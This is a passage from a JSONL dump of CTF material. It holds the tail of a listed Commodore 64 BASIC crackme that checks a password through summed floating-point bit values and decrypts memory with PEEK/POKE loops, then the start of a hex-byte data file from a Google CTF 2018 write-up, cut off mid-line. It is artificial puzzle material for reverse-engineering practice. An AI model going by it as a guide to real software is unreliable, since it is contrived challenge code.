AND 64 THEN P6 = 0.0000152587890629440892098500626161694527\n43FB:  2037: IF BA AND 128 THEN P7 = 0.0000038146972657360223024625156540423632\n443C:  2040: IF BB AND 1 THEN P8 = 0.0000009536743164340055756156289135105908\n447B:  2031: IF BB AND 2 THEN P9 = 0.0000002384185791085013939039072283776477\n44BA:  2032: IF BB AND 4 THEN PA = 0.0000000596046447771253484759768070944119\n44F9:  2033: IF BB AND 8 THEN PB = 0.000000014901161194281337118994201773603\n4537:  2034: IF BB AND 16 THEN PC = 0.0000000037252902985703342797485504434007\n4577:  2050: K = V + P0 + P1 + P2 + P3 + P4 + P5 + P6 + P7 + P8 + P9 + PA + PB + PC\n45C2:  2060: G = 0.729182238224924\n45DC:  2100: T8 = K = G : A = 86 : B = 10\n45FD:  2200: IF T8 = -1 THEN A = 83 : B = 5\n461C:  2210: POKE 1024 + CHKOFF + 9, 90\n4638:  2500: REM\n463E:  2900: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n4679:  2905: POKE 1024 + CHKOFF + 9, A:POKE 55296 + CHKOFF + 9, B\n46AC:  2910: POKE 03397, 00223 : POKE 03398, 00070 : GOTO 2001\n46D9:     0: REM\n46DF:  2001: POKE 03397, 00069 : POKE 03398, 00013\n4703:  2002: POKE 1024 + CHKOFF + 10, 81:POKE 55296 + CHKOFF + 10, 7\n4739:  2004: ES = 18360 : EE = 19633 : EK = 214\n4760:  2005: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n479B:  2009: POKE 1024 + CHKOFF + 10, 87\n47B8:  2010: V = 0.6666666666612316235641 + 0.00000000046566128730773925781250 : G = 0\n4806:  2020: BC = ASC( MID$(P$, 17, 1) )\n4821:  2021: BA = ASC( MID$(P$, 15, 1) )\n483C:  2022: BB = ASC( MID$(P$, 16, 1) )\n4857:  2025: P0 = 0:P1 = 0:P2 = 0:P3 = 0:P4 = 0:P5 = 0:P6 = 0:P7 = 0:P8 = 0:P9 = 0:PA = 0:PB = 0:PC = 0\n48B6:  2030: IF BA AND 32 THEN P0 = 0.062500000001818989403545856475830078125\n48F5:  2031: IF BA AND 64 THEN P1 = 0.0156250000004547473508864641189575195312\n4935:  2032: IF BA AND 128 THEN P2 = 0.0039062500001136868377216160297393798828\n4976:  2033: IF BB AND 1 THEN P3 = 0.0009765625000284217094304040074348449707\n49B5:  2034: IF BB AND 2 THEN P4 = 0.0002441406250071054273576010018587112427\n49F4:  2035: IF BB AND 4 THEN P5 = 0.0000610351562517763568394002504646778107\n4A33:  2036: IF BB AND 8 THEN P6 = 0.0000152587890629440892098500626161694527\n4A72:  2037: IF BB AND 16 THEN P7 = 0.0000038146972657360223024625156540423632\n4AB2:  2040: IF BB AND 32 THEN P8 = 0.0000009536743164340055756156289135105908\n4AF2:  2031: IF BB AND 64 THEN P9 = 0.0000002384185791085013939039072283776477\n4B32:  2032: IF BB AND 128 THEN PA = 0.0000000596046447771253484759768070944119\n4B73:  2033: IF BC AND 1 THEN PB = 0.000000014901161194281337118994201773603\n4BB1:  2034: IF BC AND 2 THEN PC = 0.0000000037252902985703342797485504434007\n4BF0:  2050: K = V + P0 + P1 + P2 + P3 + P4 + P5 + P6 + P7 + P8 + P9 + PA + PB + PC\n4C3B:  2060: G = 0.682352954987467\n4C55:  2100: T9 = K = G : A = 86 : B = 10\n4C76:  2200: IF T9 = -1 THEN A = 83 : B = 5\n4C95:  2210: POKE 1024 + CHKOFF + 10, 90\n4CB2:  2500: REM\n4CB8:  2900: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n4CF3:  2905: POKE 1024 + CHKOFF + 10, A:POKE 55296 + CHKOFF + 10, B\n4D28:  2910: POKE 03397, 00091 : POKE 03398, 00077 : GOTO 2001\n4D55:     0: REM\n4D5B:  2001: POKE 03397, 00069 : POKE 03398, 00013\n4D7F:  2002: POKE 1024 + CHKOFF + 11, 81:POKE 55296 + CHKOFF + 11, 7\n4DB5:  2004: ES = 20020 : EE = 21265 : EK = 245\n4DDC:  2005: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n4E17:  2009: POKE 1024 + CHKOFF + 11, 87\n4E34:  2010: V = 0.6666666666612316235641 - 0.00000000046566128730773925781250 : G = 0\n4E82:  2020: BA = ASC( MID$(P$, 17, 1) )\n4E9D:  2021: BB = ASC( MID$(P$, 18, 1) )\n4EB8:  2025: P0 = 0:P1 = 0:P2 = 0:P3 = 0:P4 = 0:P5 = 0:P6 = 0:P7 = 0:P8 = 0:P9 = 0:PA = 0:PB = 0:PC = 0\n4F17:  2030: IF BA AND 4 THEN P0 = 0.062500000001818989403545856475830078125\n4F55:  2031: IF BA AND 8 THEN P1 = 0.0156250000004547473508864641189575195312\n4F94:  2032: IF BA AND 16 THEN P2 = 0.0039062500001136868377216160297393798828\n4FD4:  2033: IF BA AND 32 THEN P3 = 0.0009765625000284217094304040074348449707\n5014:  2034: IF BA AND 64 THEN P4 = 0.0002441406250071054273576010018587112427\n5054:  2035: IF BA AND 128 THEN P5 = 0.0000610351562517763568394002504646778107\n5095:  2036: IF BB AND 1 THEN P6 = 0.0000152587890629440892098500626161694527\n50D4:  2037: IF BB AND 2 THEN P7 = 0.0000038146972657360223024625156540423632\n5113:  2040: IF BB AND 4 THEN P8 = 0.0000009536743164340055756156289135105908\n5152:  2031: IF BB AND 8 THEN P9 = 0.0000002384185791085013939039072283776477\n5191:  2032: IF BB AND 16 THEN PA = 0.0000000596046447771253484759768070944119\n51D1:  2033: IF BB AND 32 THEN PB = 0.000000014901161194281337118994201773603\n5210:  2034: IF BB AND 64 THEN PC = 0.0000000037252902985703342797485504434007\n5250:  2050: K = V + P0 + P1 + P2 + P3 + P4 + P5 + P6 + P7 + P8 + P9 + PA + PB + PC\n529B:  2060: G = 0.745769257191599\n52B5:  2100: TA = K = G : A = 86 : B = 10\n52D6:  2200: IF TA = -1 THEN A = 83 : B = 5\n52F5:  2210: POKE 1024 + CHKOFF + 11, 90\n5312:  2500: REM\n5318:  2900: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n5353:  2905: POKE 1024 + CHKOFF + 11, A:POKE 55296 + CHKOFF + 11, B\n5388:  2910: POKE 03397, 00187 : POKE 03398, 00083 : GOTO 2001\n53B5:     0: REM\n53BB:  2001: POKE 03397, 00069 : POKE 03398, 00013\n53DF:  2002: POKE 1024 + CHKOFF + 12, 81:POKE 55296 + CHKOFF + 12, 7\n5415:  2004: ES = 21652 : EE = 22923 : EK = 203\n543C:  2005: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n5477:  2009: POKE 1024 + CHKOFF + 12, 87\n5494:  2010: V = 0.6666666666612316235641 - 0.00000000023283064365386962890625 : G = 0\n54E2:  2020: BA = ASC( MID$(P$, 18, 1) )\n54FD:  2021: BB = ASC( MID$(P$, 19, 1) )\n5518:  2022: BC = ASC( MID$(P$, 20, 1) )\n5533:  2025: P0 = 0:P1 = 0:P2 = 0:P3 = 0:P4 = 0:P5 = 0:P6 = 0:P7 = 0:P8 = 0:P9 = 0:PA = 0:PB = 0:PC = 0\n5592:  2030: IF BA AND 128 THEN P0 = 0.062500000001818989403545856475830078125\n55D2:  2031: IF BB AND 1 THEN P1 = 0.0156250000004547473508864641189575195312\n5611:  2032: IF BB AND 2 THEN P2 = 0.0039062500001136868377216160297393798828\n5650:  2033: IF BB AND 4 THEN P3 = 0.0009765625000284217094304040074348449707\n568F:  2034: IF BB AND 8 THEN P4 = 0.0002441406250071054273576010018587112427\n56CE:  2035: IF BB AND 16 THEN P5 = 0.0000610351562517763568394002504646778107\n570E:  2036: IF BB AND 32 THEN P6 = 0.0000152587890629440892098500626161694527\n574E:  2037: IF BB AND 64 THEN P7 = 0.0000038146972657360223024625156540423632\n578E:  2040: IF BB AND 128 THEN P8 = 0.0000009536743164340055756156289135105908\n57CF:  2031: IF BC AND 1 THEN P9 = 0.0000002384185791085013939039072283776477\n580E:  2032: IF BC AND 2 THEN PA = 0.0000000596046447771253484759768070944119\n584D:  2033: IF BC AND 4 THEN PB = 0.000000014901161194281337118994201773603\n588B:  2034: IF BC AND 8 THEN PC = 0.0000000037252902985703342797485504434007\n58CA:  2050: K = V + P0 + P1 + P2 + P3 + P4 + P5 + P6 + P7 + P8 + P9 + PA + PB + PC\n5915:  2060: G = 0.666743217501820\n592F:  2100: TB = K = G : A = 86 : B = 10\n5950:  2200: IF TB = -1 THEN A = 83 : B = 5\n596F:  2210: POKE 1024 + CHKOFF + 12, 90\n598C:  2500: REM\n5992:  2900: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n59CD:  2905: POKE 1024 + CHKOFF + 12, A:POKE 55296 + CHKOFF + 12, B\n5A02:  2910: POKE 03397, 00053 : POKE 03398, 00090 : GOTO 2001\n5A2F:     0: REM\n5A35:  2001: POKE 03397, 00069 : POKE 03398, 00013\n5A59:  2002: POKE 1024 + CHKOFF + 13, 81:POKE 55296 + CHKOFF + 13, 7\n5A8F:  2004: ES = 23310 : EE = 24584 : EK = 223\n5AB6:  2005: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n5AF1:  2009: POKE 1024 + CHKOFF + 13, 87\n5B0E:  2010: V = 0.6666666666612316235641 + 0.00000000023283064365386962890625 : G = 0\n5B5C:  2020: BA = ASC( MID$(P$, 20, 1) )\n5B77:  2021: BB = ASC( MID$(P$, 21, 1) )\n5B92:  2022: BC = ASC( MID$(P$, 22, 1) )\n5BAD:  2025: P0 = 0:P1 = 0:P2 = 0:P3 = 0:P4 = 0:P5 = 0:P6 = 0:P7 = 0:P8 = 0:P9 = 0:PA = 0:PB = 0:PC = 0\n5C0C:  2030: IF BA AND 16 THEN P0 = 0.062500000001818989403545856475830078125\n5C4B:  2031: IF BA AND 32 THEN P1 = 0.0156250000004547473508864641189575195312\n5C8B:  2032: IF BA AND 64 THEN P2 = 0.0039062500001136868377216160297393798828\n5CCB:  2033: IF BA AND 128 THEN P3 = 0.0009765625000284217094304040074348449707\n5D0C:  2034: IF BB AND 1 THEN P4 = 0.0002441406250071054273576010018587112427\n5D4B:  2035: IF BB AND 2 THEN P5 = 0.0000610351562517763568394002504646778107\n5D8A:  2036: IF BB AND 4 THEN P6 = 0.0000152587890629440892098500626161694527\n5DC9:  2037: IF BB AND 8 THEN P7 = 0.0000038146972657360223024625156540423632\n5E08:  2040: IF BB AND 16 THEN P8 = 0.0000009536743164340055756156289135105908\n5E48:  2031: IF BB AND 32 THEN P9 = 0.0000002384185791085013939039072283776477\n5E88:  2032: IF BB AND 64 THEN PA = 0.0000000596046447771253484759768070944119\n5EC8:  2033: IF BB AND 128 THEN PB = 0.000000014901161194281337118994201773603\n5F08:  2034: IF BC AND 1 THEN PC = 0.0000000037252902985703342797485504434007\n5F47:  2050: K = V + P0 + P1 + P2 + P3 + P4 + P5 + P6 + P7 + P8 + P9 + PA + PB + PC\n5F92:  2060: G = 0.682352764997662\n5FAC:  2100: TC = K = G : A = 86 : B = 10\n5FCD:  2200: IF TC = -1 THEN A = 83 : B = 5\n5FEC:  2210: POKE 1024 + CHKOFF + 13, 90\n6009:  2500: REM\n600F:  2900: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n604A:  2905: POKE 1024 + CHKOFF + 13, A:POKE 55296 + CHKOFF + 13, B\n607F:  2910: POKE 03397, 00178 : POKE 03398, 00096 : GOTO 2001\n60AC:     0: REM\n60B2:  2001: POKE 03397, 00069 : POKE 03398, 00013\n60D6:  2002: POKE 1024 + CHKOFF + 14, 81:POKE 55296 + CHKOFF + 14, 7\n610C:  2004: ES = 24971 : EE = 26178 : EK = 237\n6133:  2005: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n616E:  2009: POKE 1024 + CHKOFF + 14, 87\n618B:  2010: V = 0.6666666666612316235641 : G = 0\n61B4:  2020: BA = ASC( MID$(P$, 22, 1) )\n61CF:  2021: BB = ASC( MID$(P$, 23, 1) )\n61EA:  2025: P0 = 0:P1 = 0:P2 = 0:P3 = 0:P4 = 0:P5 = 0:P6 = 0:P7 = 0:P8 = 0:P9 = 0:PA = 0:PB = 0:PC = 0\n6249:  2030: IF BA AND 2 THEN P0 = 0.062500000001818989403545856475830078125\n6287:  2031: IF BA AND 4 THEN P1 = 0.0156250000004547473508864641189575195312\n62C6:  2032: IF BA AND 8 THEN P2 = 0.0039062500001136868377216160297393798828\n6305:  2033: IF BA AND 16 THEN P3 = 0.0009765625000284217094304040074348449707\n6345:  2034: IF BA AND 32 THEN P4 = 0.0002441406250071054273576010018587112427\n6385:  2035: IF BA AND 64 THEN P5 = 0.0000610351562517763568394002504646778107\n63C5:  2036: IF BA AND 128 THEN P6 = 0.0000152587890629440892098500626161694527\n6406:  2037: IF BB AND 1 THEN P7 = 0.0000038146972657360223024625156540423632\n6445:  2040: IF BB AND 2 THEN P8 = 0.0000009536743164340055756156289135105908\n6484:  2031: IF BB AND 4 THEN P9 = 0.0000002384185791085013939039072283776477\n64C3:  2032: IF BB AND 8 THEN PA = 0.0000000596046447771253484759768070944119\n6502:  2033: IF BB AND 16 THEN PB = 0.000000014901161194281337118994201773603\n6541:  2034: IF BB AND 32 THEN PC = 0.0000000037252902985703342797485504434007\n6581:  2050: K = V + P0 + P1 + P2 + P3 + P4 + P5 + P6 + P7 + P8 + P9 + PA + PB + PC\n65CC:  2060: G = 0.670634204987467\n65E6:  2100: TD = K = G : A = 86 : B = 10\n6607:  2200: IF TD = -1 THEN A = 83 : B = 5\n6626:  2210: POKE 1024 + CHKOFF + 14, 90\n6643:  2500: REM\n6649:  2900: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n6684:  2905: POKE 1024 + CHKOFF + 14, A:POKE 55296 + CHKOFF + 14, B\n66B9:  2910: POKE 03397, 00236 : POKE 03398, 00102 : GOTO 2001\n66E6:     0: REM\n66EC:  2001: POKE 03397, 00069 : POKE 03398, 00013\n6710:  2002: POKE 1024 + CHKOFF + 15, 81:POKE 55296 + CHKOFF + 15, 7\n6746:  2004: ES = 26565 : EE = 27837 : EK = 192\n676D:  2005: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n67A8:  2009: POKE 1024 + CHKOFF + 15, 87\n67C5:  2010: V = 0.6666666666612316235641 - 0.00000000023283064365386962890625 : G = 0\n6813:  2020: BC = ASC( MID$(P$, 25, 1) )\n682E:  2021: BA = ASC( MID$(P$, 23, 1) )\n6849:  2022: BB = ASC( MID$(P$, 24, 1) )\n6864:  2025: P0 = 0:P1 = 0:P2 = 0:P3 = 0:P4 = 0:P5 = 0:P6 = 0:P7 = 0:P8 = 0:P9 = 0:PA = 0:PB = 0:PC = 0\n68C3:  2030: IF BA AND 64 THEN P0 = 0.062500000001818989403545856475830078125\n6902:  2031: IF BA AND 128 THEN P1 = 0.0156250000004547473508864641189575195312\n6943:  2032: IF BB AND 1 THEN P2 = 0.0039062500001136868377216160297393798828\n6982:  2033: IF BB AND 2 THEN P3 = 0.0009765625000284217094304040074348449707\n69C1:  2034: IF BB AND 4 THEN P4 = 0.0002441406250071054273576010018587112427\n6A00:  2035: IF BB AND 8 THEN P5 = 0.0000610351562517763568394002504646778107\n6A3F:  2036: IF BB AND 16 THEN P6 = 0.0000152587890629440892098500626161694527\n6A7F:  2037: IF BB AND 32 THEN P7 = 0.0000038146972657360223024625156540423632\n6ABF:  2040: IF BB AND 64 THEN P8 = 0.0000009536743164340055756156289135105908\n6AFF:  2031: IF BB AND 128 THEN P9 = 0.0000002384185791085013939039072283776477\n6B40:  2032: IF BC AND 1 THEN PA = 0.0000000596046447771253484759768070944119\n6B7F:  2033: IF BC AND 2 THEN PB = 0.000000014901161194281337118994201773603\n6BBD:  2034: IF BC AND 4 THEN PC = 0.0000000037252902985703342797485504434007\n6BFC:  2050: K = V + P0 + P1 + P2 + P3 + P4 + P5 + P6 + P7 + P8 + P9 + PA + PB + PC\n6C47:  2060: G = 0.733381925616444\n6C61:  2100: TE = K = G : A = 86 : B = 10\n6C82:  2200: IF TE = -1 THEN A = 83 : B = 5\n6CA1:  2210: POKE 1024 + CHKOFF + 15, 90\n6CBE:  2500: REM\n6CC4:  2900: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n6CFF:  2905: POKE 1024 + CHKOFF + 15, A:POKE 55296 + CHKOFF + 15, B\n6D34:  2910: POKE 03397, 00103 : POKE 03398, 00109 : GOTO 2001\n6D61:     0: REM\n6D67:  2001: POKE 03397, 00069 : POKE 03398, 00013\n6D8B:  2002: POKE 1024 + CHKOFF + 16, 81:POKE 55296 + CHKOFF + 16, 7\n6DC1:  2004: ES = 28224 : EE = 29471 : EK = 157\n6DE8:  2005: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n6E23:  2009: POKE 1024 + CHKOFF + 16, 87\n6E40:  2010: V = 0.6666666666612316235641 - 0.00000000023283064365386962890625 : G = 0\n6E8E:  2020: BA = ASC( MID$(P$, 25, 1) )\n6EA9:  2021: BB = ASC( MID$(P$, 26, 1) )\n6EC4:  2025: P0 = 0:P1 = 0:P2 = 0:P3 = 0:P4 = 0:P5 = 0:P6 = 0:P7 = 0:P8 = 0:P9 = 0:PA = 0:PB = 0:PC = 0\n6F23:  2030: IF BA AND 8 THEN P0 = 0.062500000001818989403545856475830078125\n6F61:  2031: IF BA AND 16 THEN P1 = 0.0156250000004547473508864641189575195312\n6FA1:  2032: IF BA AND 32 THEN P2 = 0.0039062500001136868377216160297393798828\n6FE1:  2033: IF BA AND 64 THEN P3 = 0.0009765625000284217094304040074348449707\n7021:  2034: IF BA AND 128 THEN P4 = 0.0002441406250071054273576010018587112427\n7062:  2035: IF BB AND 1 THEN P5 = 0.0000610351562517763568394002504646778107\n70A1:  2036: IF BB AND 2 THEN P6 = 0.0000152587890629440892098500626161694527\n70E0:  2037: IF BB AND 4 THEN P7 = 0.0000038146972657360223024625156540423632\n711F:  2040: IF BB AND 8 THEN P8 = 0.0000009536743164340055756156289135105908\n715E:  2031: IF BB AND 16 THEN P9 = 0.0000002384185791085013939039072283776477\n719E:  2032: IF BB AND 32 THEN PA = 0.0000000596046447771253484759768070944119\n71DE:  2033: IF BB AND 64 THEN PB = 0.000000014901161194281337118994201773603\n721D:  2034: IF BB AND 128 THEN PC = 0.0000000037252902985703342797485504434007\n725E:  2050: K = V + P0 + P1 + P2 + P3 + P4 + P5 + P6 + P7 + P8 + P9 + PA + PB + PC\n72A9:  2060: G = 0.667648012284220\n72C3:  2100: TF = K = G : A = 86 : B = 10\n72E4:  2200: IF TF = -1 THEN A = 83 : B = 5\n7303:  2210: POKE 1024 + CHKOFF + 16, 90\n7320:  2500: REM\n7326:  2900: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n7361:  2905: POKE 1024 + CHKOFF + 16, A:POKE 55296 + CHKOFF + 16, B\n7396:  2910: POKE 03397, 00201 : POKE 03398, 00115 : GOTO 2001\n73C3:     0: REM\n73C9:  2001: POKE 03397, 00069 : POKE 03398, 00013\n73ED:  2002: POKE 1024 + CHKOFF + 17, 81:POKE 55296 + CHKOFF + 17, 7\n7423:  2004: ES = 29858 : EE = 31101 : EK = 158\n744A:  2005: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n7485:  2009: POKE 1024 + CHKOFF + 17, 87\n74A2:  2010: V = 0.6666666666612316235641 - 0.00000000023283064365386962890625 : G = 0\n74F0:  2020: BA = ASC( MID$(P$, 27, 1) )\n750B:  2021: BB = ASC( MID$(P$, 28, 1) )\n7526:  2025: P0 = 0:P1 = 0:P2 = 0:P3 = 0:P4 = 0:P5 = 0:P6 = 0:P7 = 0:P8 = 0:P9 = 0:PA = 0:PB = 0:PC = 0\n7585:  2030: IF BA AND 1 THEN P0 = 0.062500000001818989403545856475830078125\n75C3:  2031: IF BA AND 2 THEN P1 = 0.0156250000004547473508864641189575195312\n7602:  2032: IF BA AND 4 THEN P2 = 0.0039062500001136868377216160297393798828\n7641:  2033: IF BA AND 8 THEN P3 = 0.0009765625000284217094304040074348449707\n7680:  2034: IF BA AND 16 THEN P4 = 0.0002441406250071054273576010018587112427\n76C0:  2035: IF BA AND 32 THEN P5 = 0.0000610351562517763568394002504646778107\n7700:  2036: IF BA AND 64 THEN P6 = 0.0000152587890629440892098500626161694527\n7740:  2037: IF BA AND 128 THEN P7 = 0.0000038146972657360223024625156540423632\n7781:  2040: IF BB AND 1 THEN P8 = 0.0000009536743164340055756156289135105908\n77C0:  2031: IF BB AND 2 THEN P9 = 0.0000002384185791085013939039072283776477\n77FF:  2032: IF BB AND 4 THEN PA = 0.0000000596046447771253484759768070944119\n783E:  2033: IF BB AND 8 THEN PB = 0.000000014901161194281337118994201773603\n787C:  2034: IF BB AND 16 THEN PC = 0.0000000037252902985703342797485504434007\n78BC:  2050: K = V + P0 + P1 + P2 + P3 + P4 + P5 + P6 + P7 + P8 + P9 + PA + PB + PC\n7907:  2060: G = 0.749690691474855\n7921:  2100: TG = K = G : A = 86 : B = 10\n7942:  2200: IF TG = -1 THEN A = 83 : B = 5\n7961:  2210: POKE 1024 + CHKOFF + 17, 90\n797E:  2500: REM\n7984:  2900: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n79BF:  2905: POKE 1024 + CHKOFF + 17, A:POKE 55296 + CHKOFF + 17, B\n79F4:  2910: POKE 03397, 00039 : POKE 03398, 00122 : GOTO 2001\n7A21:     0: REM\n7A27:  2001: POKE 03397, 00069 : POKE 03398, 00013\n7A4B:  2002: POKE 1024 + CHKOFF + 18, 81:POKE 55296 + CHKOFF + 18, 7\n7A81:  2004: ES = 31488 : EE = 32761 : EK = 235\n7AA8:  2005: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n7AE3:  2009: POKE 1024 + CHKOFF + 18, 87\n7B00:  2010: V = 0.6666666666612316235641 - 0.00000000023283064365386962890625 : G = 0\n7B4E:  2020: BA = ASC( MID$(P$, 28, 1) )\n7B69:  2021: BB = ASC( MID$(P$, 29, 1) )\n7B84:  2022: BC = ASC( MID$(P$, 30, 1) )\n7B9F:  2025: P0 = 0:P1 = 0:P2 = 0:P3 = 0:P4 = 0:P5 = 0:P6 = 0:P7 = 0:P8 = 0:P9 = 0:PA = 0:PB = 0:PC = 0\n7BFE:  2030: IF BA AND 32 THEN P0 = 0.062500000001818989403545856475830078125\n7C3D:  2031: IF BA AND 64 THEN P1 = 0.0156250000004547473508864641189575195312\n7C7D:  2032: IF BA AND 128 THEN P2 = 0.0039062500001136868377216160297393798828\n7CBE:  2033: IF BB AND 1 THEN P3 = 0.0009765625000284217094304040074348449707\n7CFD:  2034: IF BB AND 2 THEN P4 = 0.0002441406250071054273576010018587112427\n7D3C:  2035: IF BB AND 4 THEN P5 = 0.0000610351562517763568394002504646778107\n7D7B:  2036: IF BB AND 8 THEN P6 = 0.0000152587890629440892098500626161694527\n7DBA:  2037: IF BB AND 16 THEN P7 = 0.0000038146972657360223024625156540423632\n7DFA:  2040: IF BB AND 32 THEN P8 = 0.0000009536743164340055756156289135105908\n7E3A:  2031: IF BB AND 64 THEN P9 = 0.0000002384185791085013939039072283776477\n7E7A:  2032: IF BB AND 128 THEN PA = 0.0000000596046447771253484759768070944119\n7EBB:  2033: IF BC AND 1 THEN PB = 0.000000014901161194281337118994201773603\n7EF9:  2034: IF BC AND 2 THEN PC = 0.0000000037252902985703342797485504434007\n7F38:  2050: K = V + P0 + P1 + P2 + P3 + P4 + P5 + P6 + P7 + P8 + P9 + PA + PB + PC\n7F83:  2060: G = 0.682356773410023\n7F9D:  2100: TH = K = G : A = 86 : B = 10\n7FBE:  2200: IF TH = -1 THEN A = 83 : B = 5\n7FDD:  2210: POKE 1024 + CHKOFF + 18, 90\n7FFA:  2500: REM\n8000:  2900: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n803B:  2905: POKE 1024 + CHKOFF + 18, A:POKE 55296 + CHKOFF + 18, B\n8070:  2910: POKE 03397, 00163 : POKE 03398, 00128 : GOTO 2001\n809D:     0: REM\n80A3:  2001: POKE 03397, 00069 : POKE 03398, 00013\n80C7:  2002: POKE 1024 + CHKOFF + 19, 81:POKE 55296 + CHKOFF + 19, 7\n80FD:  2004: ES = 33148 : EE = 34367 : EK = 143\n8124:  2005: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n815F:  2009: POKE 1024 + CHKOFF + 19, 87\n817C:  2010: V = 0.6666666666612316235641 - 0.00000000023283064365386962890625 : G = 0\n81CA:  2020: BA = ASC( MID$(P$, 30, 1) )\n81E5:  2025: P0 = 0:P1 = 0:P2 = 0:P3 = 0:P4 = 0:P5 = 0:P6 = 0:P7 = 0:P8 = 0:P9 = 0:PA = 0:PB = 0:PC = 0\n8244:  2030: IF BA AND 4 THEN P0 = 0.062500000001818989403545856475830078125\n8282:  2031: IF BA AND 8 THEN P1 = 0.0156250000004547473508864641189575195312\n82C1:  2032: IF BA AND 16 THEN P2 = 0.0039062500001136868377216160297393798828\n8301:  2033: IF BA AND 32 THEN P3 = 0.0009765625000284217094304040074348449707\n8341:  2034: IF BA AND 64 THEN P4 = 0.0002441406250071054273576010018587112427\n8381:  2035: IF BA AND 128 THEN P5 = 0.0000610351562517763568394002504646778107\n83C2:  2036: IF BX AND 64 THEN P6 = 0.0000152587890629440892098500626161694527\n8402:  2037: IF BX AND 128 THEN P7 = 0.0000038146972657360223024625156540423632\n8443:  2040: IF BX AND 1 THEN P8 = 0.0000009536743164340055756156289135105908\n8482:  2031: IF BX AND 2 THEN P9 = 0.0000002384185791085013939039072283776477\n84C1:  2032: IF BX AND 4 THEN PA = 0.0000000596046447771253484759768070944119\n8500:  2033: IF BX AND 8 THEN PB = 0.000000014901161194281337118994201773603\n853E:  2034: IF BX AND 16 THEN PC = 0.0000000037252902985703342797485504434007\n857E:  2050: K = V + P0 + P1 + P2 + P3 + P4 + P5 + P6 + P7 + P8 + P9 + PA + PB + PC\n85C9:  2060: G = 0.670817057136476\n85E3:  2100: TJ = K = G : A = 86 : B = 10\n8604:  2200: IF TJ = -1 THEN A = 83 : B = 5\n8623:  2210: POKE 1024 + CHKOFF + 19, 90\n8640:  2500: REM\n8646:  2900: FOR I = ES TO EE : K = ( PEEK(I) + EK ) AND 255 : POKE I, K : NEXT I\n8681:  2905: POKE 1024 + CHKOFF + 19, A:POKE 55296 + CHKOFF + 19, B\n86B6:  2910: POKE 03397, 00239 : POKE 03398, 00134 : GOTO 2001\n86E3:     0: REM\n86E9:  2000: REM\n86EF:  2001: REM\n86F5: 31337: T = T0 + T1 + T2 + T3 + T4 + T5 + T6 + T7 + T8 + T9 + TA + TB + TC + TD + TE + TF + TG + TH + TJ\n875A: 31338: IF T = -19 THEN GOTO 31340\n8772: 31339: PRINT:PRINT\"VERDICT: NOPE\":GOTO 31345\n8791: 31340: PRINT:PRINT\"VERDICT: CORRECT\"\n87AB: 31345: GOTO 31345\n87B7:     0: REM\n87BD:     0: \n", "timestamp": "2025-10-24T11:39:02.879083"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2018-06-23-Google-CTF-Quals/scripts/feel-it/data.txt", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2018-06-23-Google-CTF-Quals/scripts/feel-it/data.txt", "content": "02:00:54:42:53:1d:15:1e:00:01:1d:00:41:5e:24:4e:4f:4a:06:00:1e:11:2d:1e:00:3a:0a:19:1b:11:1e:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n02:00:54:42:53:43:57:47:5e:5e:7d:00:22:28:16:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n02:00:54:42:53:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:49:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:49:5e:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n02:00:54:42:53:6a:07:11:1b:0a:1e:48:0e:13:11:07:07:00:18:7b:2b:49:5e:4b:c0:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n02:00:54:42: